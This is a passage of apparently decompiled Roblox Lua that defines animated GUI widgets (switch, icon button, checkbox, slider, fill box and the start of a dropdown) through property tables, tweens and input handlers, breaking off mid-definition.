		v1362("Switch", {Size={"\4\0\0Vector2",Vector2.new(40, 20)},Enabled={"\3\0\0boolean",true},Value={"\3\0\1boolean",false},BarTransparency={"\3\0\0number",0},BarThickness={"\3\0\0number",18},MarkupImage={"\3\0\0string","rbxassetid://3457843087"},MarkupColor3={"\4\0\0Color3",v1357.Cloud},MarkupTransparency={"\3\0\0number",0},MarkupSize={"\4\0\0number",0.8},SliderType={"\0\0\0SliderType",v1354.SliderType.Round},SideSheet={"\3\0\0string",""},BarOnlineColor3={"\4\0\0Color3",Color3.fromRGB(115, 135, 219)},BarOfflineColor3={"\4\0\0Color3",Color3.fromRGB(112, 115, 124)},MarkupSizeOffset={"\4\0\0number",4},MarkupDistance={"\4\0\0number",3},ClickDarkness={"\4\0\0number",20},TogleTweenInfo={"\4\0\0TweenInfo",TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.In)},ValueChanged={"\4\0\1Event"}}, {BarOnlineColor="BarOnlineColor3",BarOfflineColor="BarOfflineColor3",MarkupColor="MarkupColor3"}, function(v1956, v1957, v1958)
			local v1959 = v1333(v1956);
			local v1960 = v1959.__Fields;
			local v1961 = Instance.new("Frame", v1365(v1957));
			local v1962 = Instance.new("Frame", v1961);
			local v1963 = Instance.new("ImageLabel", v1962);
			local v1964 = Instance.new("ImageLabel", v1962);
			local v1965 = Instance.new("ImageLabel", v1962);
			local v1966 = Instance.new("TextButton", v1961);
			v1961.Name = v1334 .. "MagnoliaSwitch";
			v1961.BorderSizePixel = 0;
			v1961.BackgroundTransparency = 1;
			v1964.BackgroundTransparency = 1;
			v1964.BorderSizePixel = 0;
			v1964.AnchorPoint = Vector2.new(0, 0.5);
			v1964.Position = UDim2.new(1, 0, 0.5, 0);
			v1964.ImageRectSize = Vector2.new(400, 800);
			v1964.ImageRectOffset = Vector2.new(400, 0);
			v1964.Name = v1334 .. "RightSide";
			v1963.BackgroundTransparency = 1;
			v1963.BorderSizePixel = 0;
			v1963.AnchorPoint = Vector2.new(1, 0.5);
			v1963.Position = UDim2.new(0, 0, 0.5, 0);
			v1963.ImageRectSize = Vector2.new(400, 800);
			v1963.ImageRectOffset = Vector2.new(0, 0);
			v1963.Name = v1334 .. "LeftSide";
			v1966.Text = "";
			v1966.Name = v1334 .. "Hitbox";
			v1966.BorderSizePixel = 0;
			v1966.BackgroundTransparency = 1;
			v1966.Size = UDim2.new(1, 0, 1, 0);
			v1966.AnchorPoint = Vector2.new(0.5, 0.5);
			v1966.Position = UDim2.new(0.5, 0, 0.5, 0);
			v1966.ZIndex = 2;
			v1962.BorderSizePixel = 0;
			v1962.AnchorPoint = Vector2.new(0.5, 0.5);
			v1962.Position = UDim2.new(0.5, 0, 0.5, 0);
			v1962.Name = v1334 .. "Bar";
			v1965.Name = v1334 .. "Markup";
			v1965.BorderSizePixel = 1;
			v1965.BackgroundTransparency = 1;
			v1965.Image = v1960.MarkupImage;
			local v2001 = false;
			local v2002 = true;
			v1966.MouseEnter:Connect(function()
				v2001 = true;
			end);
			v1966.MouseLeave:Connect(function()
				v2001 = false;
			end);
			v1966.MouseButton1Down:Connect(function()
				v2002 = true;
				if v1960.Enabled then
					local v3123;
					if v1960.Value then
						v3123 = v1960.BarOnlineColor3;
					else
						v3123 = v1960.BarOfflineColor3;
					end
					local v3124, v3125, v3126 = v3123:ToHSV();
					v3126 = v3126 - ((v1960.ClickDarkness / 100) * v3126);
					v3123 = Color3.fromHSV(v3124, v3125, v3126);
					v1337:Create(v1961, v1960.TogleTweenInfo, {BackgroundColor3=v3123}):Play();
					local v3127;
					v3127 = v1336.InputEnded:Connect(function(v3248)
						if (v3248.UserInputType == Enum.UserInputType.MouseButton1) then
							v3127:Disconnect();
							if (v1960.Enabled and v2001) then
								v1960.Toggle(v1956);
							else
								v1960.RestoreBackground(v1956);
							end
						end
					end);
				end
			end);
			v1961.Changed:Connect(function(v2711)
				if (v2711 == "BackgroundColor3") then
					v1963.ImageColor3 = v1961.BackgroundColor3;
					v1964.ImageColor3 = v1961.BackgroundColor3;
					v1962.BackgroundColor3 = v1961.BackgroundColor3;
				end
			end);
			v1959.__Instance = v1961;
			v1959.__Base2D = v1961;
			v1959.__CHitbox = v1966;
			v1959.__Background = v1961;
			v1959.Bar = v1962;
			v1959.RightSide = v1964;
			v1959.LeftSide = v1963;
			v1959.Markup = v1965;
			v1960.Redraw(v1956);
			v1960.Toggle(v1956, v1960.Value);
		end, function(v2011)
			v2011['BarOnlineColor3'] = function(v2712, v2713)
				if v2712.MainColorTween then
					v2712.MainColorTween:Cancel();
				end
				local v2714;
				if v2713.Value then
					v2714 = v2713.BarOnlineColor3;
				else
					v2714 = v2713.BarOfflineColor3;
				end
				v2712.__Instance.BackgroundColor3 = v2714;
			end;
			v2011['BarOfflineColor3'] = v2011['BarOnlineColor3'];
			v2011['BarTransparency'] = function(v2716, v2717)
				v2716.Bar.BackgroundTransparency = v2717.BarTransparency;
				v2716.LeftSide.ImageTransparency = v2717.BarTransparency;
				v2716.RightSide.ImageTransparency = v2717.BarTransparency;
			end;
			v2011['MarkupSize'] = function(v2722, v2723)
				v2722.Markup.ImageTransparency = v2723.MarkupTransparency;
				v2722.Markup.Size = UDim2.new(0, v2723.MarkupSize, 0, v2723.MarkupSize);
				v2722.Markup.ImageColor3 = v2723.MarkupColor3;
			end;
			v2011['MarkupColor3'] = v2011['MarkupSize'];
			v2011['MarkupDistance'] = v2011['MarkupSize'];
			v2011['MarkupTransparency'] = v2011['MarkupSize'];
			v2011['SliderType'] = function(v2729, v2730)
				local v2731 = v2730.SliderType.Value;
				if (v2731 == "") then
					v2729.LeftSide.Image = v2730.SideSheet;
					v2729.RightSide.Image = v2730.SideSheet;
					v2729.Markup.Image = v2730.MarkupImage;
				else
					v2729.LeftSide.Image = v2731;
					v2729.RightSide.Image = v2731;
					v2729.Markup.Image = v2731;
				end
			end;
			v2011['SlideSheet'] = v2011['SliderType'];
			v2011['MarkupImage'] = v2011['SliderType'];
			v2011['BarThickness'] = function(v2732, v2733)
				v2732.__Instance.Size = UDim2.new(0, v2733.Size.X, 0, v2733.Size.Y);
				v2732.LeftSide.Size = UDim2.new(0, v2733.BarThickness / 2, 1, 0);
				v2732.RightSide.Size = UDim2.new(0, v2733.BarThickness / 2, 1, 0);
				v2732.Bar.Size = UDim2.new(1, -v2733.BarThickness, 1, 0);
				local v2738 = math.min(v2732.Bar.AbsoluteSize.X, v2732.Bar.AbsoluteSize.Y) * v2733.MarkupSize;
				v2732.Markup.Size = UDim2.new(0, v2738, 0, v2738);
			end;
			v2011['Size'] = v2011['BarThickness'];
		end, {RestoreBackground=function(v2024)
			local v2025 = v1333(v2024);
			local v2026 = v2025.__Fields;
			local v2027;
			if v2026.Value then
				v2027 = v2026.BarOnlineColor3;
			else
				v2027 = v2026.BarOfflineColor3;
			end
			v1337:Create(v2025.__Instance, v2026.TogleTweenInfo, {BackgroundColor3=v2027}):Play();
		end,Toggle=function(v2028, v2029)
			local v2030 = v1333(v2028);
			local v2031 = v2030.ValueChanged;
			local v2032 = v2030.__Instance;
			local v2033 = v2030.Markup;
			local v2034 = v2030.__Fields;
			local v2035 = v2034.MarkupDistance;
			local v2036 = v2034.BarOnlineColor3;
			local v2037 = v2034.BarOfflineColor3;
			if (type(v2029) ~= "boolean") then
				v2029 = not v2034.Value;
			end
			if (v2029 == false) then
				v1337:Create(v2033, v2034.TogleTweenInfo, {Position=UDim2.new(0, v2035 - (v2034.BarThickness / 2), 0.5, 0),AnchorPoint=Vector2.new(0, 0.5)}):Play();
				v2030.MainColorTween = v1337:Create(v2032, v2034.TogleTweenInfo, {BackgroundColor3=v2037});
				v2030.MainColorTween:Play();
				v2034.Value = false;
			elseif (v2029 == true) then
				v1337:Create(v2033, v2034.TogleTweenInfo, {Position=UDim2.new(1, (v2034.BarThickness / 2) - v2035, 0.5, 0),AnchorPoint=Vector2.new(1, 0.5)}):Play();
				v2030.MainColorTween = v1337:Create(v2032, v2034.TogleTweenInfo, {BackgroundColor3=v2036});
				v2030.MainColorTween:Play();
				v2034.Value = true;
			end
			v2031:Fire(v2034.Value);
		end});
		v1362("ButtonIcon", {Size={"\4\0\0UDim2",UDim2.new(0, 25, 0, 25)},IconSize={"\3\0\0number",13},IconRotation={"\3\0\0number",0},HoverSize={"\3\0\0number",2},Clicked={"\4\0\1Event"}}, {}, function(v2038, v2039)
			local v2040 = v1333(v2038);
			local v2041 = v2040.__Fields;
			local v2042 = Instance.new("Frame", v1365(v2039));
			local v2043 = Instance.new("UICorner", v2042);
			local v2044 = Instance.new("ImageLabel", v2042);
			local v2045 = Instance.new("TextButton", v2042);
			v2042.Name = v1334 .. "ButtonIcon";
			v2042.BackgroundColor3 = v1357.DimMidnightBlue;
			v2042.Size = UDim2.new(0, 25, 0, 25);
			v2042.AnchorPoint = Vector2.new(0.5, 0.5);
			v2043.CornerRadius = UDim.new(1, 0);
			v2044.BackgroundTransparency = 1;
			v2044.Image = "rbxassetid://3754291346";
			v2044.AnchorPoint = Vector2.new(0.5, 0.5);
			v2044.Position = UDim2.new(0.5, 0, 0.5, 0);
			v2044.ImageColor3 = v1357.Cloud;
			v2045.Text = "";
			v2045.BackgroundTransparency = 1;
			v2045.Size = UDim2.new(1, 0, 1, 0);
			v2045.AnchorPoint = Vector2.new(0.5, 0.5);
			v2045.Position = UDim2.new(0.5, 0, 0.5, 0);
			local v2063 = false;
			local function v2064()
				v2042.Size = v2041.Size;
				v2044.Size = UDim2.new(0, v2041.IconSize, 0, v2041.IconSize);
			end
			local v2065 = function()
				v2063 = true;
				local v2743 = UDim2.new(0, v2041.HoverSize, 0, v2041.HoverSize);
				v2042.Size = v2041.Size + v2743;
				v2044.Size = v2044.Size + v2743;
			end;
			v2045.MouseEnter:Connect(v2065);
			v2045.MouseLeave:Connect(function()
				v2063 = false;
				v2064();
			end);
			local v2066;
			local v2067 = function(v2746)
				if (v2746.UserInputType == Enum.UserInputType.MouseButton1) then
					if v2063 then
						v2040.Clicked:Fire();
					end
					v2065();
					v2066:Disconnect();
				end
			end;
			v2045.MouseButton1Down:Connect(function()
				v2064();
				v2066 = v1336.InputEnded:Connect(v2067);
			end);
			v2040.__Instance = v2042;
			v2040.__Base2D = v2042;
			v2040.__Background = v2042;
			v2040.__UICorner = v2043;
			v2040.__ImageRender = v2044;
			v2041.Redraw(v2038);
		end, function(v2073)
			v2073['Size'] = function(v2747, v2748)
				v2747.__Instance.Size = v2748.Size;
			end;
			v2073['IconSize'] = function(v2751, v2752)
				v2751.__ImageRender.Size = UDim2.new(0, v2752.IconSize, 0, v2752.IconSize);
			end;
			v2073['IconRotation'] = function(v2754, v2755)
				v2754.__ImageRender.Rotation = v2755.IconRotation;
			end;
		end, {});
		v1362("CheckBox", {Checked={"\3\0\0boolean",false},Size={"\3\0\0number",17},StartBoxColor3={"\4\0\0Color3",v1360.SecondaryColor},EndBoxColor3={"\4\0\0Color3",v1360.SecondaryColor},StartBoxTransparency={"\3\0\0number",0},EndBoxTransparency={"\3\0\0number",0},CheckBoxType={"\0\0\0CheckBoxType",v1354.CheckBoxType.Smooth},CheckBoxImage={"\3\0\0string",""},CheckBoxFill={"\3\0\0boolean",true},CheckImage={"\3\0\0string",""},StartCheckColor3={"\4\0\0Color3",v1360.HighlightColor},EndCheckColor3={"\4\0\0Color3",v1360.HighlightColor},StartCheckTransparency={"\3\0\0number",1},EndCheckTransparency={"\3\0\0number",0},StartCheckSize={"\3\0\0number",0},EndCheckSize={"\3\0\0number",0.5},MetroStyle={"\3\0\0boolean",true},MetroTweenInfo={"\4\0\0TweenInfo",TweenInfo.new(0.15, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)},CheckChanged={"\4\0\1Event"}}, {}, function(v2077, v2078)
			local v2079 = v1333(v2077);
			local v2080 = v2079.__Fields;
			local v2081 = Instance.new("Frame", v1365(v2078));
			local v2082 = Instance.new("ImageLabel", v2081);
			local v2083 = Instance.new("ImageLabel", v2082);
			local v2084 = Instance.new("TextButton", v2081);
			v2081.BackgroundTransparency = 1;
			v2081.BorderSizePixel = 0;
			v2081.Name = "VeraniumCheckBox";
			v2081.ZIndex = v1360.ZIndex;
			v2081.Size = UDim2.new(0, 17, 0, 17);
			v2082.BackgroundTransparency = 1;
			v2082.BorderSizePixel = 0;
			v2082.Size = UDim2.new(1, 0, 1, 0);
			v2082.Position = UDim2.new(0.5, 0, 0.5, 0);
			v2082.AnchorPoint = Vector2.new(0.5, 0.5);
			v2082.Name = v1334 .. "Box";
			v2083.BackgroundTransparency = 1;
			v2083.BorderSizePixel = 0;
			v2083.Position = UDim2.new(0.5, 0, 0.5, 0);
			v2083.AnchorPoint = Vector2.new(0.5, 0.5);
			v2083.Name = v1334 .. "CheckMark";
			v2084.BackgroundTransparency = 1;
			v2084.Text = "";
			v2084.AnchorPoint = Vector2.new(0.5, 0.5);
			v2084.Position = UDim2.new(0.5, 0, 0.5, 0);
			v2084.Size = UDim2.new(1, 5, 1, 5);
			v2084.Name = v1334 .. "Hitbox";
			v2084.MouseButton1Down:Connect(function()
				v2080.Checked = not v2080.Checked;
				v2079.CheckChanged:Fire(true);
				v2077:Check();
			end);
			v2079.__Instance = v2081;
			v2079.__Base2D = v2081;
			v2079.Box = v2082;
			v2079.Check = v2083;
			v2079.Hitbox = v2084;
			v2080.Check(v2077, false);
			v2080.Redraw(v2077);
		end, function(v2113)
			v2113['Size'] = function(v2759, v2760)
				v2759.__Instance.Size = UDim2.new(0, v2760.Size, 0, v2760.Size);
			end;
			v2113['Checked'] = function(v2762, v2763)
				v2762.CheckChanged:Fire(false);
				v2763.Check(v2762.__Proxy, false);
			end;
			v2113['StartBoxColor3'] = function(v2764, v2765)
				v2765.Check(v2764.__Proxy, false);
			end;
			v2113['EndBoxColor3'] = v2113['StartBoxColor3'];
			v2113['StartBoxTransparency'] = v2113['StartBoxColor3'];
			v2113['EndBoxTransparency'] = v2113['StartBoxColor3'];
			v2113['StartCheckColor3'] = v2113['StartBoxColor3'];
			v2113['EndCheckColor3'] = v2113['StartBoxColor3'];
			v2113['StartCheckTransparency'] = v2113['StartBoxColor3'];
			v2113['EndCheckTransparency'] = v2113['StartBoxColor3'];
			v2113['StartCheckSize'] = v2113['StartBoxColor3'];
			v2113['EndCheckSize'] = v2113['StartBoxColor3'];
			v2113['CheckBoxType'] = function(v2766, v2767)
				local v2768 = v2767.CheckBoxType.Value;
				local v2769 = v2766.Box;
				local v2770 = v2766.Check;
				if (v2768 == 4) then
					v2769.Image = v2767.CheckBoxImage;
					v2769.ImageRectSize = Vector2.new(0, 0);
					v2769.ImageRectOffset = Vector2.new(0, 0);
				else
					v2769.Image = "rbxassetid://4018402187";
					v2769.ImageRectSize = Vector2.new(100, 100);
					if v2767.CheckBoxFill then
						v2769.ImageRectOffset = Vector2.new(v2768 * 100, 100);
					else
						v2769.ImageRectOffset = Vector2.new(v2768 * 100, 0);
					end
				end
				if (v2767.CheckImage == "") then
					v2770.Image = "rbxassetid://4018402187";
					v2770.ImageRectSize = Vector2.new(100, 100);
					if (v2768 == 4) then
						v2770.ImageRectOffset = Vector2.new(0, 100);
					else
						v2770.ImageRectOffset = Vector2.new(v2768 * 100, 100);
					end
				else
					v2770.Image = v2767.CheckImage;
					v2770.ImageRectSize = Vector2.new(0, 0);
					v2770.ImageRectOffset = Vector2.new(0, 0);
				end
			end;
			v2113['CheckBoxType'] = v2113['CheckBoxType'];
			v2113['CheckImage'] = v2113['CheckBoxType'];
			v2113['CheckBoxImage'] = v2113['CheckBoxType'];
			v2113['CheckBoxFill'] = v2113['CheckBoxType'];
		end, {CreateLabel=function(v2130, v2131)
			local v2132 = v1333(v2130);
			local v2133 = v2132.___Instance;
			local v2134 = Instance.new("TextLabel", v2133);
			v2134.Text = v2131;
			v2134.Name = v1334 .. "Label";
			v2134.BackgroundTransparency = 1;
			v2134.BorderSizePixel = 0;
			v2134.Font = v1360.Font;
			v2134.TextColor3 = v1360.TextColor;
			v2134.TextTransparency = v1360.TextTransparency;
			v2134.TextYAlignment = Enum.TextYAlignment.Center;
			v2134.Size = UDim2.new(0, 0, 1, 0);
			v2132.___TextRender = v2134;
			v2132.Draw['Label'](v2132, v2132.__Fields);
		end,Check=function(v2149, v2150)
			local v2151 = v1333(v2149);
			local v2152 = v2151.__Instance;
			local v2153 = v2151.__Fields;
			if (v2150 == nil) then
				v2150 = v2153.MetroStyle;
			end
			local v2154 = v2151.Box;
			local v2155 = v2151.Check;
			local v2156, v2157;
			if not v2153.Checked then
				v2156 = {ImageColor3=v2153.StartBoxColor3,ImageTransparency=v2153.StartBoxTransparency};
				v2157 = {ImageColor3=v2153.StartCheckColor3,ImageTransparency=v2153.StartCheckTransparency,Size=UDim2.new(v2153.StartCheckSize, 0, v2153.StartCheckSize, 0)};
			else
				v2156 = {ImageColor3=v2153.EndBoxColor3,ImageTransparency=v2153.EndBoxTransparency};
				v2157 = {ImageColor3=v2153.EndCheckColor3,ImageTransparency=v2153.EndCheckTransparency,Size=UDim2.new(v2153.EndCheckSize, 0, v2153.EndCheckSize, 0)};
			end
			if v2150 then
				v1337:Create(v2154, v2153.MetroTweenInfo, {ImageColor3=v2156.ImageColor3,ImageTransparency=v2156.ImageTransparency}):Play();
				v1337:Create(v2155, v2153.MetroTweenInfo, {ImageColor3=v2157.ImageColor3,ImageTransparency=v2157.ImageTransparency,Size=v2157.Size}):Play();
			else
				v2154.ImageColor3 = v2156.ImageColor3;
				v2154.ImageTransparency = v2156.ImageTransparency;
				v2155.ImageColor3 = v2157.ImageColor3;
				v2155.ImageTransparency = v2157.ImageTransparency;
				v2155.Size = v2157.Size;
			end
		end});
		v1362("Slider", {MinValue={"\3\0\0number",0},MaxValue={"\3\0\0number",1},Value={"\3\0\0number",0.5},IsDragging={"\3\0\1boolean",false},Step={"\3\0\0number",0.01},Size={"\4\0\0Vector2",Vector2.new(0, 100)},MetroStyle={"\3\0\0boolean",true},MetroTweenInfo={"\4\0\0TweenInfo",TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)},SideSheet={"\3\0\0string",""},MarkupImage={"\3\0\0string","rbxassetid://3457843087"},BarColor3={"\4\0\0Color3",v1360.SecondaryColor},BarTransparency={"\3\0\0number",0},BarThickness={"\3\0\0number",10},MarkupColor3={"\4\0\0Color3",v1360.HighlightColor},MarkupTransparency={"\3\0\0number",0},MarkupSize={"\3\0\0number",0.6},DragEnd={"\4\0\1Event"},DragStart={"\4\0\1Event"},ValueChanged={"\4\0\1Event"}}, {}, function(v2158, v2159)
			local v2160 = v1333(v2158);
			local v2161 = v2160.__Fields;
			local v2162 = {};
			local v2163 = Instance.new("Frame", v1365(v2159));
			local v2164 = Instance.new("ImageLabel", v2163);
			local v2165 = Instance.new("TextButton", v2163);
			v2163.BackgroundTransparency = 1;
			v2163.BorderSizePixel = 0;
			v2163.Name = "MagnoliaSlider";
			v2163.ZIndex = v1360.ZIndex;
			Instance.new("UICorner", v2163);
			v2164.BackgroundTransparency = 1;
			v2164.BorderSizePixel = 0;
			v2164.AnchorPoint = Vector2.new(0.5, 0.5);
			v2164.Name = v1334 .. "Markup";
			v2165.Text = "";
			v2165.TextTransparency = 1;
			v2165.BackgroundTransparency = 1;
			v2165.BorderSizePixel = 0;
			v2165.AnchorPoint = Vector2.new(0.5, 0.5);
			v2165.Position = UDim2.new(0.5, 0, 0.5, 0);
			v2165.Size = UDim2.new(1, 5, 1, 5);
			v2165.Name = v1334 .. "Hitbox";
			local v2183 = false;
			local function v2184()
				if v2183 then
					local v3154;
					if (v2163.Rotation == -90) then
						v3154 = v1350.Y - ((v2163.AbsolutePosition.Y - (v2163.AbsoluteSize.X / 2)) + 3.5);
						v2161.Value = v1358.Map(v3154, v2163.AbsoluteSize.X, 0, v2161.MinValue, v2161.MaxValue);
					else
						v3154 = v1350.X - v2163.AbsolutePosition.X;
						v2161.Value = v1358.Map(v3154, 0, v2163.AbsoluteSize.X, v2161.MinValue, v2161.MaxValue);
					end
					if (v2161.Value > v2161.MaxValue) then
						v2161.Value = v2161.MaxValue;
					elseif (v2161.Value < v2161.MinValue) then
						v2161.Value = v2161.MinValue;
					end
					if (v2161.Step ~= 0) then
						v2161.Value = v1358.Round(v2161.Value / v2161.Step) * v2161.Step;
					end
					v2160.ValueChanged:Fire(v2161.Value);
				end
				if v2161.MetroStyle then
					local v3155 = v2164.AbsoluteSize.X / 2;
					local v3156 = v1358.Map(v2161.Value, v2161.MinValue, v2161.MaxValue, v3155 + 2, (v2163.AbsoluteSize.X - v3155) - 2);
					v1337:Create(v2164, v2161.MetroTweenInfo, {Position=UDim2.new(0, v3156, 0.5, 0)}):Play();
				else
					v2158:RelocateMarkup();
				end
			end
			v2165.MouseButton1Down:Connect(function()
				v2183 = true;
				v2161.IsDragging = v2183;
				v2160.DragStart:Fire();
				v2184();
			end);
			v2162[0] = v1336.InputEnded:Connect(function(v2772)
				if ((v2772.UserInputType == Enum.UserInputType.MouseButton1) and v2183) then
					v2183 = false;
					v2161.IsDragging = v2183;
					v2160.DragEnd:Fire();
				end
			end);
			v2162[1] = v1350.Move:Connect(v2184);
			v2165.MouseMoved:Connect(function(v2773)
			end);
			v2160.__Instance = v2163;
			v2160.__Base2D = v2163;
			v2160.__Background = v2163;
			v2160.__Connection = v2162;
			v2160.Markup = v2164;
			v2160.Hitbox = v2165;
			v2161.Redraw(v2158);
		end, function(v2193)
			v2193['MarkupImage'] = function(v2774, v2775)
				v2774.Markup.Image = v2775.MarkupImage;
			end;
			v2193['BarColor3'] = function(v2778, v2779)
				v2778.__Instance.BackgroundColor3 = v2779.BarColor3;
			end;
			v2193['BarTransparency'] = function(v2782, v2783)
				v2782.__Instance.BackgroundTransparency = v2783.BarTransparency;
			end;
			v2193['BarThickness'] = function(v2786, v2787)
				v2786.__Instance.Size = UDim2.new(v2787.Size.X, v2787.Size.Y, 0, v2787.BarThickness);
				local v2789 = math.min(v2786.__Instance.AbsoluteSize.X, v2786.__Instance.AbsoluteSize.Y) * v2787.MarkupSize;
				v2786.Markup.Size = UDim2.new(0, v2789, 0, v2789);
			end;
			v2193['Size'] = v2193['BarThickness'];
			v2193['MarkupColor3'] = function(v2791, v2792)
				v2791.Markup.ImageColor3 = v2792.MarkupColor3;
			end;
			v2193['MarkupTransparency'] = function(v2795, v2796)
				v2795.Markup.ImageTransparency = v2796.MarkupTransparency;
			end;
			v2193['REDRAW'] = function(v2799, v2800)
				v2800.RelocateMarkup(v2799.__Proxy);
			end;
			v2193['Value'] = function(v2801, v2802)
				v2802.RelocateMarkup(v2801.__Proxy);
				v2801.ValueChanged:Fire(v2802.Value);
			end;
		end, {RelocateMarkup=function(v2203)
			local v2204 = v1333(v2203);
			local v2205 = v2204.__Fields;
			local v2206 = v2204.Markup;
			if (v2205.Step ~= 0) then
				v2205.Value = v1358.Round(v2205.Value / v2205.Step) * v2205.Step;
			end
			if (v2205.Value > v2205.MaxValue) then
				v2205.Value = v2205.MaxValue;
			end
			if (v2205.Value < v2205.MinValue) then
				v2205.Value = v2205.MinValue;
			end
			v2206.Position = UDim2.new(v1358.Map(v2205.Value, v2205.MinValue, v2205.MaxValue, 0, 1), 0, 0.5, 0);
		end});
		v1362("FillBox", {Checked={"\3\0\0boolean",false},Protected={"\3\0\0boolean",false},Size={"\3\0\0number",20},LeftLabel={"\3\0\0boolean",false},LabelPadding={"\3\0\0number",2},StartBoxColor3={"\4\0\0Color3",v1357.Midnight},EndBoxColor3={"\4\0\0Color3",v1357.ElectricBlue},StartBoxTransparency={"\3\0\0number",0},EndBoxTransparency={"\3\0\0number",0},FillBoxType={"\0\0\0FillBoxType",v1354.FillBoxType.Smooth},CheckChanged={"\4\0\1Event"}}, {Value="Checked",ValueChanged="CheckChanged"}, function(v2208, v2209)
			local v2210 = v1333(v2208);
			local v2211 = v2210.__Fields;
			local v2212 = v2210.__ChangeSignal;
			local v2213 = Instance.new("Frame", v1365(v2209));
			local v2214 = Instance.new("ImageButton", v2213);
			v2213.BackgroundTransparency = 1;
			v2213.BorderSizePixel = 0;
			v2213.Name = v1334 .. "VeraniumFillBox";
			v2213.ZIndex = v1360.ZIndex;
			v2213.Size = UDim2.new(0, 17, 0, 17);
			v2214.BackgroundTransparency = 1;
			v2214.BorderSizePixel = 0;
			v2214.Size = UDim2.new(1, 0, 1, 0);
			v2214.Position = UDim2.new(0.5, 0, 0.5, 0);
			v2214.AnchorPoint = Vector2.new(0.5, 0.5);
			v2214.ImageRectSize = Vector2.new(50, 50);
			v2214.Name = v1334 .. "Box";
			v2214.ZIndex = v2213.ZIndex + 1;
			v2212.Parent = v2213;
			v2214.MouseButton1Up:Connect(function()
				if (v2211.Protected == false) then
					v2211.Checked = not v2211.Checked;
					v2208:Check(true, true);
					v2210.CheckChanged:Fire(true);
				end
			end);
			v2210.__Instance = v2213;
			v2210.__Base2D = v2213;
			v2210.__ImageRender = v2214;
			v2210.Box = v2214;
			v2211.Redraw(v2208);
		end, function(v2234)
			v2234['Size'] = function(v2803, v2804)
				v2803.__Instance.Size = UDim2.new(0, v2804.Size, 0, v2804.Size);
			end;
			v2234['EndBoxColor3'] = function(v2806, v2807)
				if v2807.Checked then
					v2806.Box.ImageColor3 = v2807.EndBoxColor3;
				else
					v2806.Box.ImageColor3 = v2807.StartBoxColor3;
				end
			end;
			v2234['EndBoxColor3'] = v2234['StartBoxColor3'];
			v2234['FillBoxType'] = function(v2808, v2809)
				local v2810 = v2809.FillBoxType.Value;
				v2808.Box.Image = v2810;
			end;
			v2234['StartBoxColor3'] = function(v2812, v2813)
				v2813.Check(v2812.__Proxy, true, true);
			end;
			v2234['EndBoxTransparency'] = v2234['StartBoxColor3'];
			v2234['StartBoxTransparency'] = v2234['StartBoxColor3'];
			v2234['EndBoxTransparency'] = v2234['StartBoxColor3'];
			v2234['Checked'] = function(v2814, v2815)
				v2814.CheckChanged:Fire(v2815.Checked);
				v2815.Check(v2814.__Proxy, true, true);
			end;
		end, {CreateLabel=function(v2242, v2243)
			local v2244 = v1333(v2242);
			local v2245 = v2244.__Instance;
			local v2246 = Instance.new("TextLabel", v2245);
			v2246.Name = v1334 .. "Label";
			v2246.Text = v2243;
			v2246.BackgroundTransparency = 1;
			v2246.BorderSizePixel = 0;
			v2246.Font = v1360.Font;
			v2246.TextColor3 = v1360.TextColor;
			v2246.TextTransparency = v1360.TextTransparency;
			v2246.TextYAlignment = Enum.TextYAlignment.Center;
			v2246.Size = UDim2.new(0, 0, 1, 0);
			v2244.__TextRender = v2246;
			v2244.Draw['Label'](v2244, v2244.__Fields);
		end,Check=function(v2261, v2262, v2263)
			local v2264 = v1333(v2261);
			local v2265 = v2264.__Instance;
			local v2266 = v2264.Box;
			local v2267 = v2264.__Fields;
			if (v2262 == nil) then
				v2262 = true;
			end
			if (v2263 == nil) then
				v2263 = true;
			end
			local v2268, v2269, v2270, v2271, v2272, v2273, v2274 = 0, 700, 50, v2267.StartBoxColor3, v2267.EndBoxColor3, v2267.StartBoxTransparency, v2267.EndBoxTransparency;
			if not v2267.Checked then
				v2268, v2269, v2270, v2271, v2272, v2273, v2274 = 650, -50, -50, v2267.EndBoxColor3, v2267.StartBoxColor3, v2267.EndBoxTransparency, v2267.StartBoxTransparency;
			end
			if ((math.floor(v2266.ImageRectOffset.X) == math.floor(v2269 - v2270)) and v2262) then
				v2266.ImageColor3 = v2272;
				v2266.ImageTransparency = v2274;
				return;
			end
			local v2275 = v2268;
			local function v2276()
				repeat
					v1341.Heartbeat:Wait();
					v2266.ImageRectOffset = Vector2.new(v2275, 0);
					v2266.ImageColor3 = v1358.MapColor(v2271, v2272, v2268, v2269, v2275);
					v2266.ImageTransparency = v1358.Map(v2275, v2268, v2269, v2273, v2274);
					v2275 = v2275 + v2270;
				until math.floor(v2275) == math.floor(v2269) 
				v2266.ImageColor3 = v2272;
				v2266.ImageTransparency = v2274;
			end
			if v2262 then
				if v2263 then
					spawn(v2276);
				else
					v2276();
				end
			else
				v2266.ImageRectOffset = Vector2.new(v2269 - v2270);
				v2266.ImageColor3 = v2272;
				v2266.ImageTransparency = v2274;
			end
			v2276 = nil;
		end});
		v1362("DropdownBox", {Size={"\4\0\0Vector2",Vector2.new(115, 25)},Enabled={"\3\0\0boolean",true},Padding={"\3\0\0Vector2",Vector2.new(5, 0)},ToggleSound={"\4\1\0Instance"},Text={"\3\0\0string","DropdownBox"},TextColor3={"\4\0\0Color3",v1360.TextColor},Count={"\3\0\1number",0},Scroll={"\3\0\0number",0},IsOpen={"\3\0\1boolean",false},CanUnselect={"\3\0\0boolean",false},SelectedIndex={"\2\1\0",nil},SelectedValue={"\2\1\1",nil},MaxDrop={"\3\0\0number",3},ShowSelected={"\3\0\0boolean",true},UseIndex={"\3\0\0boolean",false},BoxColor3={"\4\0\0Color3",v1360.BackgroundColor},BoxHoverColor3={"\4\0\0Color3",v1360.BackgroundColor},BoxOpenedColor3={"\4\0\0Color3",v1360.SecondaryColor},ArrowColor3={"\4\0\0Color3",v1357.Silver},ArrowSize={"\3\0\0number",10},Opened={"\4\0\1Event"},Closed={"\4\0\1Event"},ListChanged={"\4\0\1Event"},SelectionChanged={"\4\0\1Event"},ExpandTweenInfo={"\4\0\0TweenInfo",TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)},SlideTweenInfo={"\4\0\0TweenInfo",TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)},ScrollTweenInfo={"\4\0\0TweenInfo",TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)},ElasticyTweenInfo={"\4\0\0TweenInfo",TweenInfo.new(0.25, Enum.EasingStyle.Sine, 